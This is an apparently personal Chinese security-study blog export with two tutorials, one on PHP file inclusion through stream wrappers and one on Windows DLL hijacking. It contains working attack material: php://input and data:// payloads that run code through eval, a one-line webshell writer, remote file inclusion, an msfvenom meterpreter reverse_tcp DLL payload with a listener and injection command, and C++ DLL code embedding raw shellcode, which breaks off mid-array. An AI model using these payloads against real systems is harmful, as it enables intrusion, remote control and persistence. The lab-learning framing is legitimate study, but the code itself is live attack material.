<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
<ul>
<li><strong>php://filter</strong> 参数</li>
</ul>
<p>该协议的参数会在该协议上进行传递，多个参数都可以在一个路径下传递，具体参考如下：</p>
<table>
<thead>
<tr>
<th>php://filter 参数</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>必须项。它指定了你要筛选过滤的数据流。</td>
<td></td>
</tr>
<tr>
<td>read=&lt;读链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
<td>*）分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的过滤器&gt;</td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
<p>其中 read 与 write 处于同级路径上。</p>
<ul>
<li>可选的过滤器列表(4类)</li>
</ul>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<p>其中最常用的便是convert.base64-encode 或 convert.base64-decode ，用于加解密完整读取文件</p>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
<ul>
<li>示例：</li>
</ul>
<ol>
<li> <code>php://fileter/read=convert.base64-encode/resource=[文件名] </code>以base64加密的方式读取文件</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024202338746.png" alt="image-20211024202338746"></p>
<p>​        2.<code>php://input</code> 执行php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行任意代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /phplearn/<span class="keyword">global</span>.php?file=php:<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">93.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">93.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 36</span></span><br><span class="line"><span class="comment">Origin: http://127.0.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/phplearn/global.php</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php eval(&#x27;system(&quot;ipconfig&quot;);&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024204509292.png" alt="image-20211024204509292"> </p>
<p>写webshell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&quot;webshell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024205148007.png" alt="image-20211024205148007"></p>
<h4 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h4><ul>
<li>条件:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen: off/on;</span><br><span class="line">allow_url_include: off/on;</span><br></pre></td></tr></table></figure>

<ul>
<li>作用:<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属压缩流，可以访问压缩文件中的子文件，更重要的是，他并不需要指定后缀名，可修改为任意后缀：<code>jpg png gix</code>等等。</li>
<li>示例</li>
</ul>
<h5 id="zip-协议"><a href="#zip-协议" class="headerlink" title="zip://协议"></a>zip://协议</h5><p><code>zip://[压缩文件的绝对路径]%23[压缩文件内的子文件名]</code></p>
<p>压缩文件可以不为<strong>zip</strong>结尾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/phplearn/global.php?file=zip://D:\phpstudy_pro\WWW\phplearn\hello.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024211907449.png" alt="image-20211024211907449"></p>
<h5 id="compress-zlib-file-gz"><a href="#compress-zlib-file-gz" class="headerlink" title="compress.zlib://file.gz"></a>compress.zlib://file.gz</h5><p>压缩phpinfo.txt为phpinfo.gz并上传(同样支持任意后缀名)</p>
<p>compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.zlib://D:\phpstudy_pro\WWW\phplearn\hello.txt.gz</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025104109551.png" alt="image-20211025104109551"></p>
<h5 id="compress-bzip2-file-bzq2"><a href="#compress-bzip2-file-bzq2" class="headerlink" title="compress.bzip2://file.bzq2"></a>compress.bzip2://file.bzq2</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=compress.bzip2://D:\phpstudy_pro\WWW\phplearn\hello.txt.bz2</span></span><br></pre></td></tr></table></figure>

<p>此处我的电脑未能正常解析php文件。</p>
<h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><ul>
<li>条件</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:on;</span><br><span class="line">allow_url_include:one;</span><br></pre></td></tr></table></figure>

<ul>
<li>作用: 自<code>php&gt;=5.2.0</code>起，可以使用<code>data://</code> 数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</li>
<li>语法:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br><span class="line">data:<span class="comment">//text/plain;base64,<span class="meta">&lt;?php</span> php代码 <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<h5 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain"></a>data://text/plain</h5><p>若是GET传参，在bp中应注意空格转换为%20避免解析错误</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105240142.png" alt="image-20211025105240142"></strong></p>
<h5 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data://text/plain;base64,"></a>data://text/plain;base64,</h5><p>将php代码转为base64形式，特殊字符转为url格式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105549575.png" alt="image-20211025105549575"></p>
<h4 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp;https:// 协议"></a>http:// &amp;https:// 协议</h4><ul>
<li>条件</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_fopen:on</span><br></pre></td></tr></table></figure>

<ul>
<li>作用: 常规url格式，允许<code>http 1.0</code>的GET方法，以只读访问文件或资源换。CTF常用于远程文件包含</li>
<li>用法</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure>

<ul>
<li>示例</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//10.31.22.30/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025105851296.png" alt="image-20211025105851296"></p>
<h4 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a>phar:// 协议</h4><p>phar:// 协议与zip协议类似，同样可以访问zip格式的压缩包内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phar:<span class="comment">//D:\phpstudy_pro\WWW\phplearn\phpinfo.zip\phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211025110236065.png" alt="image-20211025110236065"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>DLL劫持学习</title>
    <url>/2021/10/18/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="什么是dll文件？"><a href="#什么是dll文件？" class="headerlink" title="什么是dll文件？"></a>什么是dll文件？</h3><p>DLL（Dynamic Link Library）被称为动态链接库文件，又被称之为“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p>
<p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去按照顺序搜索这些特定目录时下查找这个DLL,只要能够将恶意的DLL放在优先于正常DLL所在的目录，就能够欺骗系统优先加载恶意DLL，来实现”劫持”上线</p>
<h3 id="dll原理利用"><a href="#dll原理利用" class="headerlink" title="dll原理利用"></a>dll原理利用</h3><span id="more"></span>

<h4 id="Windows-xp-sp2之前"><a href="#Windows-xp-sp2之前" class="headerlink" title="Windows xp sp2之前"></a>Windows xp sp2之前</h4><p>windows查找DLL的目录以及对应顺序：</p>
<ol>
<li>进程对应的应用程序所在目录</li>
<li>当前目录</li>
<li>系统目录（Current Directory）</li>
<li>16位系统目录</li>
<li>Windows目录（通过GetWindowsDirectory 获取）</li>
<li>PATH环境变量中的各个目录</li>
</ol>
<p>例如：在一个PC上，doc文档打开会首先被应用程序office打开，而office运行的时候会加载系统的一个dll文件，系统的dll不是在应用程序的所在目录当中，而是会去系统目录中去查找，这是根据调用dll目录的优先级顺序可知，我们如果在当前目录，也就是doc文件所在目录放上一个恶意的dll来代替系统dll被加载进office程序中，则会执行dll中恶意代码从而被上线。</p>
<h4 id="Windows-xp-sp2之后"><a href="#Windows-xp-sp2之后" class="headerlink" title="Windows xp sp2之后"></a>Windows xp sp2之后</h4><p>Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode  默认会被开启）</p>
<p>默认注册表为：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1</p>
<ol>
<li>进程对应的应用程序所在目录（可理解为程序安装目录比如C:\ProgramFiles\uTorrent）</li>
<li>系统目录（即%windir%system32）；</li>
<li>16位系统目录（即%windir%system）；</li>
<li>Windows目录（即%windir%）；</li>
<li>当前目录（运行的某个文件所在目录，比如C:\Documents and Settings\Administrator\Desktop\test）；</li>
<li>PATH环境变量中的各个目录；</li>
</ol>
<h4 id="Windows-7-以上版本"><a href="#Windows-7-以上版本" class="headerlink" title="Windows 7 以上版本"></a>Windows 7 以上版本</h4><p>系统取消了SafeDllSearchMode 而启用KnowDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置为：</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p>
<p>那么最终Windows2003以上以及win7以上操作系统，会结合“DLL路径搜索顺序”和KnownDLLs注册表项”的机制来确定应用程序将要调用的DLL路径，之后，应用程序会将DLL载入自己内存空间，通过导入导出表来调用执行相关功能。</p>
<ul>
<li>默认情况之下，若软件安装在c盘根目录，而不是c:\Program Files，哪经过身份验证的用户具有该目录的写权限，另外，perl,python,ruby等软件都添加到path变量中，攻击者可以调用python等程序在当前目录中编写Dll，只要重新运行程序就会中招</li>
<li>SafeDllSearchMode + KnownDLLs二者结合可以用来防范dll劫持，但如果调用未曾出现于knowDlls表上的dll，那么无论SafeDllSearchMode模式是否会被开启，应用程序调用dll默认搜索路径始终会先从程序的当前目录开始，这边就存在一个攻击手段，可利用反汇编软件，找出PE程序所调用的不常见dll（不在KnowDlls目录中的），利用Windows特性，即不在名单之内的dll优先在本层目录下调用，可写一份恶意dll在应用程序的同级目录下优先加载调用，实现getshell或维权</li>
</ul>
<h3 id="dll劫持检查"><a href="#dll劫持检查" class="headerlink" title="dll劫持检查"></a>dll劫持检查</h3><h4 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h4><p>利用Process Explorer 检查exe程序主要加载的dll文件，此处借助搜Tim应用来学习搜索可劫持dll。</p>
<p>此处可发现Resource.dll,未在系统目录下进行调用，推测此dll文件未在KnowDlls列表中。</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016095907746.png" alt="image-20211016095907746"></p>
<p>在KnowDlls中检查，确实发现不在其中</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016094442231.png" alt="image-20211016094442231"></p>
<p>由此可知，搜狗拼音启动时，可以从应用所在目录下优先调用dll文件，这就造成了dll文件劫持的风险。</p>
<h4 id="DLL-Hijack-Auditor-DLL劫持审计器"><a href="#DLL-Hijack-Auditor-DLL劫持审计器" class="headerlink" title="DLL Hijack Auditor(DLL劫持审计器)"></a>DLL Hijack Auditor(DLL劫持审计器)</h4><p>下载地址：<a href="http://securityxploded.com/getsoftware_direct.php?id=7777">http://securityxploded.com/getsoftware_direct.php?id=7777</a></p>
<p>误报率较高</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016100521662.png" alt="image-20211016100521662"></p>
<h4 id="Rattler"><a href="#Rattler" class="headerlink" title="Rattler"></a>Rattler</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sensepost/rattler/releases</span><br></pre></td></tr></table></figure>

<p>探测了好多，一个也没成功</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016102119448.png" alt="image-20211016102119448"></p>
<h4 id="dll-hijack-detect"><a href="#dll-hijack-detect" class="headerlink" title="dll_hijack_detect"></a>dll_hijack_detect</h4><p>下载地址：<a href="https://github.com/adamkramer/dll_hijack_detect/releases">https://github.com/adamkramer/dll_hijack_detect/releases</a></p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016102924938.png" alt="image-20211016102924938"></p>
<p>可以检测到系统上正在运行的进程中的DLL劫持，</p>
<p>不过误报也比较多</p>
<h3 id="复现劫持DLL"><a href="#复现劫持DLL" class="headerlink" title="复现劫持DLL"></a>复现劫持DLL</h3><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>启动应用程序</li>
<li>使用Procesds Explorer等类似的软件查看该应用程序启动后加载的动态链接库</li>
<li>在该应用程序已加载的DLL列表中，查找在KnowDLLs注册表项不存在的DLL</li>
<li>编写从上一步获取到的DLL的劫持dll</li>
<li>将编写好的劫持dll放到该应用程序目录下，重新启动该应用程序，检查是否劫持成功。</li>
</ol>
<h4 id="自动化工具实现DLL劫持上线"><a href="#自动化工具实现DLL劫持上线" class="headerlink" title="自动化工具实现DLL劫持上线"></a>自动化工具实现DLL劫持上线</h4><p>利用msfvenom生成Dll形式的payload</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.43</span><span class="number">.128</span> LPORT=<span class="number">5555</span> -f dll -o SciLexer.dll</span><br></pre></td></tr></table></figure>

<p>劫持前先利用Msfconsole开启监听准备上线。</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016111915554.png" alt="image-20211016111915554"></p>
<p>再将生成的dll文件，放入目标机器当中，打开notepad。利用InjectProc.exe进行自动化注入:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">InjectProc.exe dll_inj SciLexer.dll notepad.exe</span><br></pre></td></tr></table></figure>

<p>此时我们可以发现，靶机已经上线，但这种方法由于是msf一键生成的dll 载荷，需要再进行免杀操作，直接使用，百分百会被真实环境中的杀软拦截，且不便于做维权操作。</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016111706588.png" alt="image-20211016111706588"></p>
<h4 id="手动编写DLL实现上线"><a href="#手动编写DLL实现上线" class="headerlink" title="手动编写DLL实现上线"></a>手动编写DLL实现上线</h4><p>利用vs2019-动态链接库项目</p>
<p>每个DLL文件均有一份dllmain.cpp源文件，其DLL程序入口点在此，实现功能在此处添加</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, <span class="comment">//模块句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call, <span class="comment">//调用原因</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved    <span class="comment">//参数保留</span></span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call) <span class="comment">//根据调用原因选择不同的加载方式</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:    <span class="comment">//DLL被某个进程加载调用</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH: <span class="comment">//DLL被某个线程调用</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH: <span class="comment">//DLL被某个线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:    <span class="comment">//DLL被某个进程卸载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>头文件 ： framework.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN             <span class="comment">// 从 Windows 头文件中排除极少使用的内容</span></span></span><br><span class="line"><span class="comment">// Windows 头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pch.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pch.h: 这是预编译标头文件。</span></span><br><span class="line"><span class="comment">// 下方列出的文件仅编译一次，提高了将来生成的生成性能。</span></span><br><span class="line"><span class="comment">// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。</span></span><br><span class="line"><span class="comment">// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。</span></span><br><span class="line"><span class="comment">// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试引入Windows.h在dll文件当中，制作MessageBox弹窗</p>
<h4 id="调用DLL"><a href="#调用DLL" class="headerlink" title="调用DLL"></a>调用DLL</h4><h5 id="Python调用"><a href="#Python调用" class="headerlink" title="Python调用"></a>Python调用</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">dll = ctypes.CDLL(<span class="string">&quot;C:\\Users\\86156\\Desktop\\免杀学习\\dll劫持学习\\刘姥姥初试DLL\\Debug\\刘姥姥初试DLL.exe&quot;</span>)</span><br><span class="line">a=dll.func()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016133534638.png" alt="image-20211016133534638"></p>
<h5 id="c-运行时动态连接"><a href="#c-运行时动态连接" class="headerlink" title="c++运行时动态连接"></a>c++运行时动态连接</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//定义一个函数类</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*addfun)</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*messagefun)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//指定加载dll库</span></span><br><span class="line">	HMODULE hdll = <span class="built_in">LoadLibrary</span>(<span class="built_in">LPCWSTR</span>(<span class="string">L&quot;C:\\Users\\86156\\Desktop\\刘姥姥初试DLL.dll&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (hdll != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//程序找到dll并成功载入</span></span><br><span class="line">		messagefun message = (messagefun)<span class="built_in">GetProcAddress</span>(hdll, <span class="string">&quot;message&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (message != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">message</span>();</span><br><span class="line">		<span class="built_in">FreeLibrary</span>(hdll);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;句柄获取失败，刘姥姥得了菜花&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016140951886.png" alt="image-20211016140951886"></p>
<p>成功导出dll内的message函数，导入到动态链接.exe中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI DoMagic(LPVOID lpParameter) &#123;</span><br><span class="line"></span><br><span class="line">    unsigned char buffer[]=&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span><br><span class="line">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span><br><span class="line">&quot;\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9&quot;</span><br><span class="line">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span><br><span class="line">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span><br><span class="line">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span><br><span class="line">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48&quot;</span><br><span class="line">&quot;\x18\x44\x8b\x40\x20\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span><br><span 